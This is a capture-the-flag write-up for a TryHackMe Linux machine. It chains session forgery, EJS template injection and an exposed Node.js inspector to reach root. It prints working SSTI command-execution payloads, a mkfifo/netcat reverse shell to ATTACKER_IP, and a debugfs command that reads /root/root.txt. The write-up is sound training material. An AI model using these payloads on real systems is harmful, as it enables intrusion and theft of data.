# TryHackMe - DoNotDisturb Writeup

> **Platform:** TryHackMe
> **Challenge:** DoNotDisturb
> **Category:** Linux | Node.js | SQL Injection | Insecure Deserialization | SSTI | Privilege Escalation

---

# Overview

Today we are back with another **HackerHolidays** challenge from **TryHackMe** named **DoNotDisturb**.

This is a Linux Boot2Root machine that combines several modern web application vulnerabilities into a complete attack chain. The machine begins with an Express.js web application that appears secure at first glance, but deeper investigation reveals insecure session handling. By exploiting a deserialization issue combined with SQL Injection, we are able to obtain a privileged session cookie and access the staff portal. Further testing identifies a Server-Side Template Injection (SSTI) vulnerability, which ultimately provides Remote Code Execution. Finally, local enumeration uncovers an exposed Node.js debugging interface that allows direct interaction with privileged processes, leading to the retrieval of the root flag.

This room emphasizes the importance of combining multiple low-level vulnerabilities rather than relying on a single exploit.

---

# Challenge Scenario

The challenge begins with the following briefing.

> Signs on the door. Room's active. You have access you were never given, and so does he.

> The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. And it becomes clear that whoever's already inside has been moving for far longer than you have.

> The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

From the description, it is clear that this challenge revolves around **session management** and unauthorized access rather than a straightforward web vulnerability.

---

# Target Information

| Information      | Value            |
| ---------------- | ---------------- |
| Machine Name     | DoNotDisturb     |
| Platform         | TryHackMe        |
| Difficulty       | Boot2Root        |
| Operating System | Linux            |
| Target IP        | **10.49.138.40** |

---

# Initial Reconnaissance

The first step is identifying the exposed services.

A complete TCP scan is performed.

```bash
nmap -p- 10.49.138.40
```

The scan reveals only two open ports.

```text
22/tcp   SSH
80/tcp   HTTP
```

Since SSH requires valid credentials, attention immediately shifts toward the web application.

---

# Service Enumeration

A service and version detection scan is then performed.

```bash
nmap -sC -sV 10.49.138.40
```

The results reveal:

| Port | Service | Version                    |
| ---- | ------- | -------------------------- |
| 22   | OpenSSH | 9.6p1                      |
| 80   | HTTP    | Node.js Express Middleware |

The webpage title is:

```text
Byte Lotus — Poolside
```

Unlike Apache or Nginx based applications, this server is running **Express.js**, suggesting that JavaScript-based attack vectors may become relevant later.

---

# Initial Web Enumeration

Opening the application redirects users to the main interface.

The site presents a simple poolside booking application.

Since nothing immediately stands out, Burp Suite is launched so every request and response can be inspected throughout the assessment.

---

# Directory Enumeration

The next step is discovering hidden routes.

Gobuster is executed using a common directory wordlist.

```bash
gobuster dir \
-u http://10.49.138.40 \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

The scan reveals several interesting endpoints.

```text
/logout
/login
/staff
```

The most interesting discovery is:

```text
/staff
```

Attempting to browse this endpoint results in:

```text
403 Forbidden
```

This confirms that the page exists but access is restricted.

At this stage we know:

* The application contains a hidden staff area.
* Authentication or authorization is preventing access.
* No obvious credentials have yet been discovered.

---

# Investigating the Application

Since directory enumeration reveals very little, the next step is analyzing the application itself.

The HTTP response headers indicate that the backend is running on **Node.js Express**.

Rather than blindly searching for generic exploits, we begin looking at vulnerabilities commonly associated with Express applications.

Several attack vectors are tested, including:

* Cookie manipulation
* Session tampering
* JSON payload modification
* Parameter fuzzing

None of these immediately provide access.

This machine intentionally requires more investigation than the average beginner room.

---

# Discovering the Initial Vulnerability

After considerable testing, the vulnerable functionality becomes apparent.

The application performs insecure deserialization of session-related data.

Further experimentation shows that combining this weakness with **SQL Injection** allows the creation of a privileged session.

This stage is intentionally tricky because neither vulnerability alone is enough.

Instead, the attack requires chaining both weaknesses together.

Once the crafted payload succeeds, the application returns a new authenticated session cookie.

This cookie belongs to a privileged user.

---

# Accessing the Staff Panel

The newly obtained cookie is copied into the browser.

Refreshing the page and navigating back to:

```text
/staff
```

no longer produces a **403 Forbidden** response.

Instead, the staff dashboard loads successfully.

The page displays:

```text
Dear <%= guest %>,

your Byte Lotus cabana is confirmed.
```

At first glance this appears to be a harmless template.

However, something immediately stands out.

Instead of rendering the variable directly, the application is displaying template syntax.

This strongly suggests the possibility of **Server-Side Template Injection (SSTI).**

---

# Confirming SSTI

Before attempting command execution, a simple arithmetic payload is used.

Entering:

```text
7*7
```

causes the page to render:

```text
49
```

This confirms that user-controlled input is being evaluated server-side.

The application is vulnerable to SSTI.

Once SSTI is confirmed, arbitrary JavaScript execution becomes possible.

---

# Enumerating the Server

Rather than immediately spawning a shell, the first objective is understanding the environment.

The following payload is submitted.

```ejs
<pre><%- process.getBuiltinModule('child_process').execSync('ls -lah').toString() %></pre>
```

The server responds with:

```text
app.js

node_modules

package-lock.json

package.json
```

This confirms several things.

* The application is Node.js based.
* The template engine allows direct execution of child processes.
* Remote Code Execution has effectively already been achieved.

At this stage, there is no need to continue using SSTI for individual commands.

The next objective is obtaining a fully interactive reverse shell.

---

# Obtaining Remote Code Execution

A Netcat listener is started.

```bash
nc -lvnp 4444
```

The SSTI payload is modified to execute a reverse shell.

```ejs
<pre><%- process.getBuiltinModule('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f').toString() %></pre>
```

Submitting the payload immediately produces a connection.

```text
connect to ATTACKER_IP

uid=1001(poolside)
```

The shell executes as:

```text
poolside
```

---

# Shell Stabilization

The shell initially lacks proper terminal functionality.

Using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

the shell is upgraded.

The terminal is then configured.

```bash
CTRL+Z

stty raw -echo

fg

export TERM=xterm-256color
```

The session is now fully interactive.

---

# User Flag

Navigating to the user's home directory:

```bash
cat ~/user.txt
```

returns:

```text
THM}
```

The first objective has now been completed.

---

# Privilege Escalation Enumeration

Checking sudo permissions:

```bash
sudo -l
```

reveals no useful privilege escalation path.

Instead of focusing on sudo, attention shifts toward the backend services running on the system.

Listing running processes reveals:

```text
root

jukeboxd.py

gunicorn

Node.js Debugging
```

The root-owned process immediately attracts attention.

Further investigation reveals that a **Node.js Inspector** service is listening locally.

---

# Exploiting the Node Debugger

Connecting to the debugger:

```bash
node inspect 127.0.0.1:9229
```

successfully opens an interactive debugging session.

Unlike SSTI, this interface allows direct execution of JavaScript.

Dropping into the REPL:

```text
repl
```

provides arbitrary code execution inside the Node runtime.

Rather than spawning another shell, the debugger is used to access the underlying filesystem directly.

Executing:

```javascript
process.getBuiltinModule('child_process').execFileSync(
'/usr/sbin/debugfs',
['-R','cat /root/root.txt','/dev/nvme0n1p1'],
{encoding:'utf8'}
)
```

returns:

```text
THM{}
```

The debugger executes with sufficient privileges to read directly from the filesystem, allowing the root flag to be recovered without requiring a traditional root shell.

---

# Attack Flow

```text
Nmap Enumeration
        │
        ▼
Discover Express.js Application
        │
        ▼
Directory Enumeration
        │
        ▼
Identify Restricted /staff Endpoint
        │
        ▼
SQL Injection + Insecure Deserialization
        │
        ▼
Obtain Privileged Session Cookie
        │
        ▼
Access Staff Dashboard
        │
        ▼
Identify SSTI
        │
        ▼
Confirm Template Injection
        │
        ▼
Remote Code Execution
        │
        ▼
Reverse Shell
        │
        ▼
Shell Stabilization
        │
        ▼
Capture User Flag
        │
        ▼
Discover Node Debugger
        │
        ▼
Connect to Inspector
        │
        ▼
Access Filesystem with debugfs
        │
        ▼
Capture Root Flag
```

---

# Vulnerabilities Identified

* Insecure session deserialization
* SQL Injection
* Session hijacking through forged cookies
* Server-Side Template Injection (SSTI)
* Arbitrary command execution
* Exposed Node.js Inspector interface
* Excessive privileges available through the debugging interface
* Direct filesystem access using debugfs

---

# Key Takeaways

DoNotDisturb demonstrates how several moderate vulnerabilities can be chained together into a complete system compromise. The attack began with insecure session handling combined with SQL Injection, allowing unauthorized access to a restricted staff portal. Once inside, an SSTI vulnerability provided arbitrary command execution and a reverse shell as the application user.

The privilege escalation phase highlights a less common but highly impactful issue: exposing a Node.js Inspector service. Debugging interfaces are intended for development and should never be accessible on production systems. In this case, the debugger provided direct access to privileged functionality, allowing sensitive files to be read from disk without obtaining an interactive root shell.

The room reinforces the importance of securing session management, validating user input, disabling development services in production, and restricting access to debugging interfaces that can expose powerful capabilities far beyond their intended purpose.
